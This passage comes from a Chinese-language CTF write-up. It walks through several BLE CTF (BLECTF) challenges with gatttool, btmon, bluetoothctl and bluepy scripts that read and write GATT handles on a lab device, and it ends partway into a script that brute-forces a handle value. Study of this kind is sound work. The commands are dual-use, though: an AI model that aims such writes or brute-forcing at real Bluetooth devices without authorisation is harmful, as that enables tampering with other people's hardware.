class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo btmon | grep -A 5 -B 5 -i &#x27;0x0034&#x27;     </span><br><span class="line">[sudo] password for kali: </span><br><span class="line">        Handle: 0x0033</span><br><span class="line">        Value[5]: 0a340006ff</span><br><span class="line">            Properties: 0x0a</span><br><span class="line">              Read (0x02)</span><br><span class="line">              Write (0x08)</span><br><span class="line">            Value Handle: 0x0034</span><br><span class="line">            Value UUID: Unknown (0xff06)</span><br><span class="line">        Handle: 0x0035</span><br><span class="line">        Value[5]: 0a360007ff</span><br><span class="line">            Properties: 0x0a</span><br><span class="line">              Read (0x02)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是一些解释</p><ol><li><strong>handle &#x3D; 0x0033 (来自 gatttool –characteristics 输出)</strong><ul><li><strong>类型:</strong> 这是<strong>特征声明 (Characteristic Declaration)</strong> 的句柄。</li><li><strong>作用:</strong> 这个句柄本身代表了“这里有一个特征”的声明。它包含了一些元数据：<ul><li>该特征的属性&#x2F;权限 (Properties): 0x0a (根据 btmon 输出，这意味着 Read 0x02 + Write 0x08)。</li><li>指向实际存储该特征值的<strong>值句柄 (Value Handle)</strong>: 0x0034。</li><li>该特征的 UUID: 0000ff06-… (标识这个特征是什么)。</li></ul></li><li><strong>交互:</strong> 你通常<strong>不直接</strong>读取或写入特征声明句柄 (0x0033) 本身。它的值 (0a340006ff 来自 btmon) 包含了上面提到的元数据，由客户端在发现过程中读取。</li></ul></li><li><strong>char value handle &#x3D; 0x0034 (来自 gatttool –characteristics 输出) &#x2F; Value Handle: 0x0034 (来自 btmon 输出)</strong><ul><li><strong>类型:</strong> 这是<strong>特征值 (Characteristic Value)</strong> 的句柄。</li><li><strong>作用:</strong> 这个句柄指向<strong>实际存储数据的地方</strong>。当你想要读取这个特征当前的值，或者想要向这个特征写入新值时，你<strong>必须使用这个句柄</strong>。</li><li><strong>交互:</strong><ul><li>要<strong>读取</strong>这个特征的值，你应该执行 gatttool … –char-read -a 0x0034。</li><li>要<strong>写入</strong>这个特征的值（因为它具有 Write 属性 0x08），你应该执行 gatttool … –char-write-req -a 0x0034 -n <hex_data> 或 gatttool … –char-write -a 0x0034 -n <hex_data>。</li></ul></li></ul></li></ol><ul><li><strong>0x0033 是特征声明句柄 (Characteristic Declaration Handle):</strong> 它是一个元数据条目，描述了特征的存在、属性（权限）、值句柄和 UUID。它的值包含了这些结构化的信息，通常不由客户端直接写入来改变用户数据。</li><li><strong>0x0034 是特征值句柄 (Characteristic Value Handle):</strong> 这才是<strong>实际存储该特征数据的地方</strong>。所有针对该特征的读写操作都应该<strong>直接作用于这个句柄</strong>。</li></ul><p>所以如果要使用bluetoothctl来修改句柄0x0034的值，需要指定对象路径<code>/org/bluez/hci0/dev_64_B7_08_61_B9_7E/service0028/char0033</code>而不是0x0033<br>但我尝试了下，还是无法写入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">[BLECTF]# </span><span class="language-bash">select-attribute /org/bluez/hci0/dev_64_B7_08_61_B9_7E/service0028/char0033</span></span><br><span class="line"><span class="meta prompt_">[BLECTF]# </span><span class="language-bash">write <span class="string">&quot;0x79 0x6f&quot;</span></span></span><br><span class="line">No attribute selected</span><br><span class="line"><span class="meta prompt_">[BLECTF]# </span><span class="language-bash">select-attribute 0000ff06-0000-1000-8000-00805f9b34fb</span></span><br><span class="line"><span class="meta prompt_">[BLECTF]# </span><span class="language-bash">write <span class="string">&quot;0x79 0x6f&quot;</span></span></span><br><span class="line">No attribute selected</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-脚本"><a href="#3-脚本" class="headerlink" title="3.脚本"></a>3.脚本</h3><p>bluepy 通常需要 root 权限来访问底层的蓝牙接口和 bluepy-helper 程序。<br>不需要额外的进行<code>pip install bluepy</code>,当你尝试这样做时反而会报错<br>不建议使用bleak来做这题，理由和bluetoothctl一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> bluepy <span class="keyword">import</span> btle</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 配置参数 ---</span></span><br><span class="line">DEVICE_ADDRESS = <span class="string">&quot;64:B7:08:61:B9:7E&quot;</span>  <span class="comment"># 替换为你的目标设备 MAC 地址</span></span><br><span class="line"><span class="comment"># 地址类型：通常是公共地址。如果是随机地址，使用 btle.ADDR_TYPE_RANDOM</span></span><br><span class="line">ADDR_TYPE = btle.ADDR_TYPE_PUBLIC</span><br><span class="line">TARGET_HANDLE = <span class="number">0x0034</span>              <span class="comment"># 你要写入数据的目标句柄</span></span><br><span class="line">DATA_TO_WRITE = <span class="string">b&quot;yo&quot;</span>               <span class="comment"># 要写入的 ASCII 值 &quot;yo&quot;，表示为字节串 (bytes)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;正在连接到 <span class="subst">&#123;DEVICE_ADDRESS&#125;</span>...&quot;</span>)</span><br><span class="line">conn = <span class="literal">None</span>  <span class="comment"># 初始化连接对象为 None，以便在 finally 中检查</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 创建连接对象并连接</span></span><br><span class="line">    conn = btle.Peripheral(DEVICE_ADDRESS, ADDR_TYPE)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;连接成功!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在向句柄 <span class="subst">&#123;<span class="built_in">hex</span>(TARGET_HANDLE)&#125;</span> 写入 <span class="subst">&#123;DATA_TO_WRITE!r&#125;</span>...&quot;</span>)</span><br><span class="line">    <span class="comment"># 执行写入操作</span></span><br><span class="line">    <span class="comment"># 第一个参数是目标句柄</span></span><br><span class="line">    <span class="comment"># 第二个参数是要写入的数据（必须是 bytes 类型）</span></span><br><span class="line">    <span class="comment"># withResponse=True 表示执行 Write Request (需要响应)，类似 gatttool --char-write-req</span></span><br><span class="line">    <span class="comment"># 如果需要 Write Command (无响应)，则设置 withResponse=False</span></span><br><span class="line">    conn.writeCharacteristic(TARGET_HANDLE, DATA_TO_WRITE, withResponse=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;写入成功!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> btle.BTLEDisconnectError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># 捕获断开连接错误</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;连接已断开: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> btle.BTLEException <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># 捕获其他 bluepy 相关的蓝牙错误</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;蓝牙错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># 捕获其他任何意外错误</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;发生意外错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="comment"># 无论成功还是失败，最后都尝试断开连接</span></span><br><span class="line">    <span class="keyword">if</span> conn:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;正在断开连接...&quot;</span>)</span><br><span class="line">            conn.disconnect()</span><br><span class="line">        <span class="keyword">except</span> btle.BTLEException <span class="keyword">as</span> e:</span><br><span class="line">             <span class="comment"># 如果连接已因错误断开，再次断开可能会抛出异常，此处捕获</span></span><br><span class="line">             <span class="built_in">print</span>(<span class="string">f&quot;断开连接时发生错误（可能已断开）: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(myenv)─(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo python ble1.py                                            </span><br><span class="line">正在连接到 64:B7:08:61:B9:7E...</span><br><span class="line">连接成功!</span><br><span class="line">正在向句柄 0x34 写入 b&#x27;yo&#x27;...</span><br><span class="line">写入成功!</span><br><span class="line">正在断开连接...     </span><br><span class="line">┌──(myenv)─(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0034|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">c55c6314b3db0a6128af</span><br><span class="line"></span><br><span class="line">┌──(myenv)─(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x7-写入hex值"><a href="#0x7-写入hex值" class="headerlink" title="0x7 写入hex值"></a>0x7 写入hex值</h2><p>%% 按照读取 handle 0x0036 中的说明进行操作。请记住，有些工具只写入十六进制值，而其他工具提供写入十六进制或 ASCII 的方法 %%<br>读取要求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0036|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>要求写入hex值：Write the hex value 0x07 here<br>结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0036|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Write the hex value 0x07 here</span><br><span class="line"> </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0036 -n 7</span><br><span class="line">Invalid value</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0036 -n 07</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0036|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">1179080b29f8da16ad66</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;1179080b29f8da16ad66&quot;|xxd -ps)</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:7 /20</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-gatttool-1"><a href="#1-gatttool-1" class="headerlink" title="1.gatttool"></a>1.gatttool</h3><p>gatttool 的 -n 参数期望一个十六进制<strong>字符串</strong>。对于单个字节 0x07，其十六进制字符串表示就是 07。（注意是07不是7）<br>gatttool 的 -n 参数期望接收的是一个有效的十六进制字符串，而不仅仅是一个数字字符</p><ul><li>在十六进制中，有效的字符是 0-9 和 a-f (或 A-F)。单个字符 7 是一个有效的十六进制数字，代表数值 7。</li><li><strong>但是，</strong> gatttool（以及底层的蓝牙协议）通常期望十六进制数据是<strong>成对出现的</strong>，因为一个字节通常用<strong>两个</strong>十六进制字符表示（例如，00 到 ff）。<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0036 -n 7</span><br><span class="line">Invalid value</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0036 -n 07</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0036|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">1179080b29f8da16ad66</span><br><span class="line"></span><br></pre></td></tr></table></figure>其他形式能够写入，但是判定不正确<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0036 -n 0x07</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0036|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Write the hex value 0x07 here</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li></ul><h3 id="2-脚本"><a href="#2-脚本" class="headerlink" title="2.脚本"></a>2.脚本</h3><p>使用bluepy</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> bluepy <span class="keyword">import</span> btle</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 配置参数 ---</span></span><br><span class="line">DEVICE_ADDRESS = <span class="string">&quot;64:B7:08:61:B9:7E&quot;</span>  <span class="comment"># 替换为你的 MAC 地址</span></span><br><span class="line">ADDR_TYPE = btle.ADDR_TYPE_PUBLIC</span><br><span class="line">TARGET_HANDLE = <span class="number">0x0036</span>              <span class="comment"># 目标句柄</span></span><br><span class="line">HEX_VALUE_TO_WRITE = <span class="number">0x07</span>           <span class="comment"># 要写入的十六进制值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将十六进制值转换为 bytes 对象</span></span><br><span class="line">data_to_write = <span class="built_in">bytes</span>([HEX_VALUE_TO_WRITE]) <span class="comment"># -&gt; b&#x27;\x07&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;正在连接到 <span class="subst">&#123;DEVICE_ADDRESS&#125;</span>...&quot;</span>)</span><br><span class="line">conn = <span class="literal">None</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    conn = btle.Peripheral(DEVICE_ADDRESS, ADDR_TYPE)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;连接成功!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在向句柄 <span class="subst">&#123;<span class="built_in">hex</span>(TARGET_HANDLE)&#125;</span> 写入 <span class="subst">&#123;data_to_write!r&#125;</span>...&quot;</span>)</span><br><span class="line">    <span class="comment"># 执行写入操作, withResponse=True 表示 Write Request</span></span><br><span class="line">    conn.writeCharacteristic(TARGET_HANDLE, data_to_write, withResponse=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;写入成功!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> btle.BTLEDisconnectError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;连接已断开: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> btle.BTLEException <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;蓝牙错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;发生意外错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">if</span> conn:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;正在断开连接...&quot;</span>)</span><br><span class="line">            conn.disconnect()</span><br><span class="line">        <span class="keyword">except</span> btle.BTLEException <span class="keyword">as</span> e:</span><br><span class="line">             <span class="built_in">print</span>(<span class="string">f&quot;断开连接时发生错误（可能已断开）: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>记得使用sudo来执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(myenv)─(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ python ble2.py                                                 </span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/home/kali/Desktop/ble2.py&quot;, line 3, in &lt;module&gt;</span><br><span class="line">    from bluepy import btle</span><br><span class="line">ModuleNotFoundError: No module named &#x27;bluepy&#x27;</span><br><span class="line"></span><br><span class="line">┌──(myenv)─(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0036|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Write the hex value 0x07 here</span><br><span class="line"></span><br><span class="line">┌──(myenv)─(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo python ble2.py                                                  </span><br><span class="line">[sudo] password for kali: </span><br><span class="line">正在连接到 64:B7:08:61:B9:7E...</span><br><span class="line">连接成功!</span><br><span class="line">正在向句柄 0x36 写入 b&#x27;\x07&#x27;...</span><br><span class="line">写入成功!</span><br><span class="line">正在断开连接...</span><br><span class="line"></span><br><span class="line">┌──(myenv)─(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0036|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">1179080b29f8da16ad66</span><br><span class="line">   </span><br></pre></td></tr></table></figure><h2 id="0x8-指定句柄的方式"><a href="#0x8-指定句柄的方式" class="headerlink" title="0x8 指定句柄的方式"></a>0x8 指定句柄的方式</h2><p>%% 按照读取 handle 0x0038 中的说明进行作。请注意此处的句柄。请记住，句柄可以由整数或十六进制引用。大多数工具（如 gatttool 和 bleah）都允许您以两种方式指定句柄。 %%</p><p>读取要求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0038|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>Write 0xC9 to handle 58<br>也就是说将十六进制数0xc9写入句柄58就可以了，58的十六进制是0x3A</p><p>-a后面可以接十进制也可以接十六进制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0038 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br><span class="line">Write 0xC9 to handle 58</span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 58 -n &quot;$(printf &quot;\xc&quot; | xxd -ps)&quot;</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0038|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">f8b136d937fad6a2be9f</span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;f8b136d937fad6a2be9f&quot;|xxd -ps)</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:8 /20</span><br></pre></td></tr></table></figure><h2 id="0x9-多次写"><a href="#0x9-多次写" class="headerlink" title="0x9 多次写"></a>0x9 多次写</h2><p>%% 看看 handle 0x003c 并按照它所说的去做。您应该为此编写一个解决方案。另请记住，某些工具的写入速度比其他工具快。 %%<br>读取要求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x003c | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>Brute force my value 00 to ff<br>爆破句柄0x003c的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> bluepy <span class="keyword">import</span> btle</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 配置 ---</span></span><br><span class="line">DEVICE_ADDRESS = <span class="string">&quot;64:B7:08:61:B9:7E&quot;</span>      <span class="comment"># 目标设备 MAC 地址</span></span><br><span class="line">ADDR_TYPE = 